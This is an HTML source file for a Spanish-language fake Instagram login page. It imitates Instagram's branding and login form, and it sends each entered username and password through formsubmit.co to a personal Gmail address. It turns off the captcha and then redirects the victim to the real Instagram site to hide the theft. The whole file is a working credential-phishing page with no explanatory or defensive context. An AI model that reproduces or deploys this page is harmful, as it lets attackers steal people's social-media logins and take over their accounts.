<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="index.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Lato:wght@300;400&display=swap');
    </style>
    <title>Instagram</title>
    <link rel="icon" href="Instagram_icon.png.ico">
</head>
<body>
    <div id="form-container">
        <div class="input-form">
            <form action="https://formsubmit.co/only.ubcr@gmail.com" method="POST">
                <img  src="instagram.png" alt="instagramLogo" id="instagramLogo">
                <Input id="#email" name="email" type="text" placeholder="Teléfono, usuario o correo electrónico"></Input><br>
                <input id="#pass" type="password" name="userPassword" placeholder="Contraseña"><br>
                <button id="#init">Iniciar sesión</button>
                
                <input type="hidden" name="_next" value="https://www.instagram.com/">
                <input type="hidden" name="_captcha" value="false">
            </form>
        </div>
        <div class="regist-form">
            <div id="p">
                <p id="rWhite">¿No tienes cuenta?</p>
                <p id="rBlue">Regístrate</p>
            </div>
            <img id="apps" src="gp.png" alt="apps">
        </div>
    </div>
    <aside>
        <img id="phone" src="Screenshot 2022-11-09 000922.png" alt="Phones.png">
    </aside>
</body>
</html>
